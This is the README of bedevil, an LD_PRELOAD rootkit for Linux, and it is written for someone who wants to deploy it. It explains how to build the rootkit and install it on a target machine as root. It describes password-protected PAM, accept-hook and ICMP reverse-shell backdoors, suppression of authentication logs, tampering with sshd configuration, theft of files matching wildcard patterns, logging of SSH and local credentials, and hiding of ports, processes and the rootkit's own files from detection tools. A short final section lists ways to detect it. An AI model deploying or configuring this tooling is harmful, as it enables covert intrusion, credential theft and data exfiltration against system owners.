# bedevil (bdvl)

<img src=https://i.imgur.com/PyO00vy.png alt="icon" />

 * Loosely based on mempodippy previous rootkit project, [vlany](https://github.com/mempodippy/vlany).

## Overview
 * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
 * This is based on the [original bdvl](https://github.com/Error996/bdvl/tree/master), however...
   * This repository is much different from the original.
     * Besides new additions, there have been many improvements.
 * During the creation of this rootkit I had some goals in mind.
   * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
   * Fix outstanding issues. (from vlany)
   * Create a more manageable & _robust_ system of rootkit functionalities.
   * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
 * When it comes to actual rootkit dependencies, there are only a few.
   * Most will already be installed.
   * Those that aren't either
     * Will be installed by `etc/auto.sh` before rootkit installation
     * Or can be installed with `etc/depinstall.sh`
 * Now you can download from `https://www.cloudflare-ipfs.com/ipfs/QmYMdpzSaHKbYiQm5W6b9XxFVcdJkQi2AH4PVJAPa1Emu6`
   * ipfs always online

## Usage
 * Getting an installation up & running is pretty easy.
 * First you'll want to edit maybe a small handful of settings in `setup.py`.
   * You can fine tune a decent amount of stuff to your liking.
 * Next, `sh etc/depinstall.sh && make`...
   * Now in the `build/` directory there are two new files.
   * `<PAM_UNAME>.b64` & `bdvl.so.*`
 * When it comes to the actual installation, you have three choices.
   * Host the result (_for example_) `build/changeme.b64` file somewhere accessible from the target box & point the first variable in `etc/auto.sh` to wherever `changeme.b64` may be.
   * On the box, when running `etc/auto.sh` supply it a path as an argument to this file wherever it is.
   * Or with the compiled `bdvl.so.*` you can run (*as root*) `LD_PRELOAD=./build/bdvl.so.x86_64 sh -c './bdvinstall build/bdvl.so.*'`.
     * This is how `etc/auto.sh` installs bdvl after installing dependencies.

### Installation example
 * On my own machine here, I've configured bdvl how I like & have built it.
 * The output that you can expect to see from these stages may differ very slightly from the images but the process remains the same.

<img src=https://i.imgur.com/PTdmRS5.png alt=building-bdvl />

 * In this example I am using `etc/auto.sh` to grab the result (__changeme.b64__) from a _Python HTTPServer_ I've got running for this purpose.
 * The last command sent in that screenshot is once the target box is listening for my connection, as seen in the example below.

<img src=https://i.imgur.com/pmwGUb8.png alt=installation-process />

 * Now the rootkit will be in effect & you'll be able to log in.
 * In the example below I am using the 3 backdoor methods available in bdvl.

## Features & configuration information
 * Listed in the table below is a very concise overview of all of the *important* functionalities that bedevil has.
 * Most can be enabled/disabled from within `setup.py` & the others in `config.h`.

### Backdoor utility commands
 * By hooking the execve & execvp wrappers bdvl provides rootkit-related commands from a backdoor shell, accessible by running `./bdv`.

<img src=https://i.imgur.com/jbkNOHt.png alt=available-backdoor-commands-in-bdvl />

### Magic GID
 * __READ_GID_FROM_FILE__ allows changing of the rootkit's magic GID whenever you like.
 * There is a command available from within the backdoor for manual changing of the rootkit's GID.
   * `./bdv changegid`
 * __AUTO_GID_CHANGER__ is more or less what it sounds like. The rootkit will refresh its magic GID __at least__ every `GID_CHANGE_MINTIME` seconds.
   * This value can be found in [`setup.py`](https://github.com/Error996/bdvl/blob/nobash/setup.py)
   * The rootkit will not automatically change its GID when there are still rootkit processes running.
   * Otherwise there is a pretty high chance of being discovered since previous processes left with the previous GID would be visible.

### __HIDE_MY_ASS__
 * __HIDE_MY_ASS__ is intended to be a means of keeping track of files & directories created, __outside of the home & installation directory__, by (you) the rootkit user.
 * ~~For the sole purpose of rehiding them all when changing magic GID, be it manually or an automatically scheduled/timed change.~~
   * At the beginning this was solely for rehiding stuff when the rootkit changes magic GID.
     * But is now accompanied by __UNINSTALL_MY_ASS__, which, when doing `./bdv uninstall` will recursively remove all of your own misc paths on the box.
   * Paths are automatically kept track of upon creation in a backdoor shell/general rootkit process.
   * The file which contains all can be found in `my_ass` within the installation directory.
     * Paths in here will be rehidden upon GID changes.
     * If you are to unhide a path after its creation (path GID = 0), it will simply be ignored when the magic GID is being changed & files are subsequently being hidden.
     * If you would like to stop a path from being automatically rehidden upon a GID change just remove the path's line.

### Backdoors
 * All of the backdoors available in bdvl are password protected.
   * By `BACKDOOR_PASSWORD` in `setup.py`.
   * When the value is set to `None` random garbage will be used as the password.
   * The password is stored as a SHA512 hash.

#### PAM backdoor
 * By hijacking libpam & libc's authentication functions, we are able to create a phantom backdoor user.
 * [`etc/ssh.sh`](https://github.com/Error996/bdvl/blob/nobash/etc/ssh.sh) makes logging into your PAM backdoor with your hidden port that bit easier.
 * The responsible [utmp & wtmp functions](https://github.com/Error996/bdvl/tree/nobash/inc/hooks/utmp) have been hooked & information that may have indicated a backdoor user on the box is no longer easily visible.
 * Additionally the functions responsible for writing authentication logs have been hooked & intercepted to totally stop any sort of logs being written upon backdoor login.
   * See these hooks, [here (syslog)](https://github.com/Error996/bdvl/tree/nobash/inc/hooks/syslog) & [here (pam_syslog)](https://github.com/Error996/bdvl/blob/nobash/inc/backdoor/pam/pam_syslog.c).
   * _If the parent process of whatever is trying to write said auth log is that of a hidden process, the function in question simply does nothing._
   * Previously in bedevil, when interacting with the PAM backdoor, a log would be written stating that a session had been opened/closed for the root user.
   * So now this is no longer the case...
 * A problem with using this is that `UsePAM` & `PasswordAuthentication` must be enabled in the sshd config.
   * bdvl presents a couple of solutions for this. Really though it presents one solution as both work the same, primarily just at different times.
   * __HARD_PATCH_SSHD_CONFIG__ will constantly make sure the `sshd_config` file stays the way it needs to, rewriting the file when changes need to be made.
   * __SOFT_PATCH_SSHD_CONFIG__ works more or less exactly the same way as above, but applies only for the `sshd` process & does not *really* touch `sshd_config`. Basically `sshd` will read what we say it should.
     * No direct file writes/changes (to `sshd_config`) are necessary for this method. The file will appear to be untouched by any external forces when doing a normal read on it.
   * See [here](https://github.com/Error996/bdvl/tree/nobash/inc/backdoor/pam/sshdpatch) for more insight on how these work.
 * The rootkit's installation directory & your backdoor home directory are in two totally different & random locations.
   * I figured it was pretty important to separate the two spaces.
   * When no rootkit processes are running (_i.e.: not logged into the backdoor_) the rootkit will remove your `.bashrc` & `.profile`, that is until you log back in.
   * I have made everything easily accessible from the backdoor's home directory by plopping symlinks to everything you may need access to.
     * Not unlike `.bashrc` & `.profile` these symlinks are removed from the home directory until you log in.
 * If you are not root upon login, `su -` will get you set up.

#### Accept hook backdoor
 * Infected services that listen on TCP sockets for new connections, when accepting a new connection can drop you a shell.
 * For example, after sshd has restarted, it is going to be infected...
   * So with each connection it receives it will beforehand check if the connection came from a very special port.
   * The very special port will always be the first port number in `hide_ports`.

#### ICMP backdoor
 * When enabled, bdvl will spawn a hidden process on the box which will monitor a given interface for a determined magic packet.
   * The rootkit needs to be able to determine whether or not the ICMP backdoor process needs to be spawned.
   * Therefore this spawned process has its own special ID. `readgid()-1`
   * Before sending the shell back to you, another child is created so that the GID can be set back to the original. (`getgid()+1`)
 * When the rootkit is changing magic GID, automatically or with `./bdv changegid` the backdoor's process is killed & then respawned.
 * I recommend changing `MAGIC_ID`, `MAGIC_SEQ` & `MAGIC_ACK` in `setup.py`.
   * Just remember to update `etc/icmp.sh` with the new values when changing these.
 * `etc/icmp.sh` will handle sending the magic packet & listening for & receiving a reverse shell.
   * The backdoor will ignore any attempts for a reverse shell if the specified port is not a hidden port.

### Dynamic linker patching
 * Upon installation the rootkit will patch the dynamic linker libraries.
 * Before anything the rootkit will search for valid `ld.so` on the system to patch.
   * See `util/install/ldpatch/ldpatch.h` for the paths it will search.
 * Both the path to overwrite (`/etc/ld.so.preload`) & the new path (__PRELOAD_FILE__ in `setup.py`) must be the same length as each other.
 * When running `./bdv uninstall` from a backdoor shell, the rootkit will revert the libraries back to having the original path. (`/etc/ld.so.preload`)
 * [See here](https://github.com/Error996/bdvl/blob/nobash/inc/util/install/ldpatch/ldpatch.h) for more on how this works.
 * Not having __PATCH_DYNAMIC_LINKER__ enabled will instruct the rootkit to just use `/etc/ld.so.preload` instead.

### File stealing
 * Files that will be stolen are defined in `setup.py`. (__INTERESTING_FILES__)
 * Files within directories listed in __INTERESTING_DIRECTORIES__ will also be stolen.
 * Wildcards apply to filenames within __INTERESTING_FILES__.
   * i.e.: `INTERESTING_FILES = ['*.zip', '*.rar', '*.txt', '*.db', 'backup.*']`
   * You can also specify paths & they'll also support wildcards.
 * You may want to consult the default target files & the other settings surrounding it...
 * Files already stolen will be removed at least every `FILE_CLEANSE_TIMER` seconds.
   * The default value for this is once every 8 hours.
   * Change `FILE_CLEANSE_TIMER` to `None` to disable this.
 * By default the rootkit will only steal files with a max size of `MAX_FILE_SIZE` bytes.
   * __The default value for this limit is 100mb.__
   * Set this value to `None` & the rootkit will steal target files regardless of size.
   * File contents are mapped into memory and then written by a new child process.
     * If mapping the file contents should fail, bdvl can fallback on the original method of reading & writing the file contents in the calling process.
     * Enable `ORIGINAL_RW_FALLBACK` in `setup.py` if this is your desired behaviour.
     * Also for this, in setup.py there is `MAX_BLOCK_SIZE` & `BLOCKS_COUNT`... See the comments surrounding these values for more.
 * `MAX_STEAL_SIZE` in `setup.py` determines how much stolen stuff can be stored at one time.
   * __The default value for this limit is 800mb.__
 * Target files are stolen in the user's process so we aren't weirdly modifying file access times by doing this.
 * A file referenced by something such as `rm` by a user will be stolen before being removed.
   * `rm` is just a random example. This same logic applies for anything.
 * If a file has been stolen already, it will be ignored.
   * However if there has been a change in size since the last time it was stolen, it will be re-stolen.

### Credential logging
 * __LOG_LOCAL_AUTH__
   * bedevil will intercept `pam_vprompt` and log successful authentications on the box.
   * Log results are available in your installation directory.
 * __LOG_SSH__
   * bedevil intercepts `read` and `write` in order to log login attempts over ssh.
   * Again, logs are available in your installation directory.

### Evasion & hiding

#### Port hiding
 * With bedevil installed, you can hide or unhide any ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
```
$ cat hide_ports
9146
304-306
1000-1003
```
*Where a hyphen is the range delimiter...*

#### Rootkit presence
 * bedevil will hide itself from the process memory map files upon being read.
 * Reading `/proc/*/*maps`, when bedevil is installed won't reveal the kit's location.
 * ~~__HOWEVER__, dependencies required by the rootkit will be visible. (namely, libcrypt & libssl)~~
   * The rootkit's dependencies are also hidden from these files..

#### Scary things
 * bedevil will hide from defined scary processes, paths & environment variables.
 * The list of aforementioned processes, paths & variables can be found in `setup.py`..
 * i.e.: Running `ldd`.
   * Calling `ldd` as a regular user will show an error.
   * This user's privileges do not suffice.
   * The calling process __must__ have the power to uninstall & reinstall our rootkit.
   * Running `ldd` again with sufficient privilege will show a totally clean output.
   * This is because, during the runtime of (_in this case_) `ldd` the rootkit is not installed.
   * Upon the application exiting/returning, the parent (rootkit) process of whatever just finished running reinstalls the rootkit.

<hr>

### Other notes
 * While bdvl's __DO_EVASIONS__ functionality (*see [Scary things](#scary-things)*) is effective, it also presents a fairly big weakness.
   * `while true; do ldd /bin/ls >/dev/null; done`
   * This very small while loop will temporarily remove the rootkit... Until the loop is killed.
   * Leaving an open window to do some digging around in a new clean shell.
     * Rootkit files & processes will not be hidden...
     * Hidden ports will no longer be hidden... 
     * The rootkit will be visibly loaded in other (infected) process' memory map files...
   * Mitigating something like this could be tough...

 * Behaviour exhibited by __PATCH_DYNAMIC_LINKER__ can be observed by a regular user.
   * https://twitter.com/ForensicITGuy/status/1170149837490262016
     * `find /lib*/ -name 'ld-2*.so' -exec grep '/etc/ld.so.preload' {} \;`
   * Additionally if `/etc/ld.so.preload` seems to do nothing when written to, you know your box is infected.

 * A magic ID is a bruteforcable value.
   * https://pastebin.com/rZvjDzFK
     * Depending on the system something like this could take a long time until the target ID is reached.
   * bdvl somewhat lessens the threat of something like this with the implementation of the automatic GID changer.
